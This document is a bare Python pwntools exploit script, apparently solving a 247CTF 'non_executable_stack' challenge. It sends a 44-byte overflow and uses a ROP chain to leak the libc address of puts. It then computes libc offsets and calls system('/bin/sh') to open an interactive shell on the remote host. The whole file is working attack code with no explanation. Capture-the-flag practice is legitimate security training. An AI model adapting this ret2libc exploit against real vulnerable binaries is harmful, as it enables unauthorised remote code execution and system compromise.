from pwn import *
e = ELF('non_executable_stack')

puts = e.plt['puts']
main = e.symbols['main']
p = remote('fba12db0ee353b60.247ctf.com',50123)
print(puts)
p.recvline()
payload = b'A'*44
payload += p32(puts)
payload += p32(main)
payload += p32(e.got['puts'])
p.sendline(payload)
p.recvline()
puts_leak = unpack(p.recv(4))
print('PUTS leak is ',hex(puts_leak))
# ------------------------------ step 2 --------------------------------------------------
libc = ELF('libc6-i386_2.27-3ubuntu1_amd64.so')
libc_base = puts_leak - libc.symbols['puts']
print('LIBC base is' , hex(libc_base))
libc_system = libc_base + libc.symbols['system']
libc_exit = libc_base + libc.symbols['exit']
libc_shell = libc_base + next(libc.search(b'/bin/sh\x00'))
payload2 = b'A'*44 + p32(libc_system) + p32(libc_exit) + p32(libc_shell)
p.recvline()
p.sendline(payload2)
p.recvline()
p.interactive()
